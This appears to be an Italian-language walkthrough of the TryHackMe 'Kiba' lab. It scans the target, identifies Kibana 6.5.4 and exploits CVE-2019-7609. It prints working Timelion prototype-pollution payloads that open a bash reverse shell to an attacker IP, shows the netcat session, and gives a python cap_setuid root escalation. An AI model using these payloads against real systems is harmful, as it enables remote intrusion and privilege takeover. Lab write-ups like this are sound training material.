
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/kiba

Qual è la vulnerabilità specifica dei linguaggi di programmazione con ereditarietà basata su prototipi?

La "prototype pollution" è una vulnerabilità che si verifica nei linguaggi di programmazione che utilizzano l'ereditarietà basata su prototipi, come JavaScript. Questa vulnerabilità consente a un attaccante di modificare le proprietà del prototipo di un oggetto, il che può influenzare tutti gli oggetti che ereditano da quel prototipo.
```
prototype pollution
```

Qual è la versione del dashboard di visualizzazione installata sul server?

```
nmap -Pn -v -p- 10.10.33.25
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent
```

```
nmap -sVC -p22,80,5044,5601 10.10.33.25
```

```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Sun, 25 May 2025 09:04:30 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Sun, 25 May 2025 09:04:30 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Sun, 25 May 2025 09:04:30 GMT
|_    {"statusCode":404,"error":"Not Found"}

```

```
http://10.10.33.25:5601/app/kibana#/management?_g=()
```
troviamo kibana
```
6.5.4
```

Qual è il codice CVE di questa vulnerabilità? Il formato è: CVE-0000-0000

facciamo una ricerca su kibana 6.5.4
```
CVE-2019-7609
```

Compromettere la macchina e individuare user.txt

troviamo come sfruttare la vulnerabiltà su
https://github.com/mpgn/CVE-2019-7609

vai su "timelion" > incolla questo script qui sotto nella casella > "esegui"


```
10.10.73.213:5601
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.14.99.134/4444 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.14.99.134/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
premere su start e successivamente premere Canvas sulla sinistra , ripetere operazione da capo se ci sono problemi

otteniamo la reverse shell

```
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.73.213] 46248
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ 
```

```
cd /home/kiba
```

```
ls
elasticsearch-6.5.4.deb
kibana
user.txt
```

```
cat user.txt
```
Compromettere la macchina e individuare user.txt
```
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

Come elencheresti ricorsivamente tutte queste le capabilities?
```
getcap -r/
```

```
getcap -r / 2>/dev/null
```

```
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

La capacità `cap_setuid` consente a un programma di modificare temporaneamente il proprio ID utente in quello del proprietario del file, anche se l'utente non ha privilegi di root. L'indicazione `+ep` significa che il file ha sia la capacità `cap_setuid` sia il permesso di esecuzione. Avere questa capacità su un file permette di eseguirlo con i privilegi del proprietario, il che può essere sfruttato per attacchi di escalation dei privilegi in caso di vulnerabilità.

controlliamo su https://gtfobins.github.io/gtfobins/python/#capabilities come sfruttarlo

```
## Capabilities[](https://gtfobins.github.io/gtfobins/python/#capabilities)

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

- ```
    cp $(which python) .
    sudo setcap cap_setuid+ep python
    
    ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
    ```
```

```
python -c 'import os; os.system("/bin/sh")'
```

```bash
cat /root/root.txt
THM{xxxxxxxxxxxx}
```

```
THM{xxxxxxxxxxx}
```

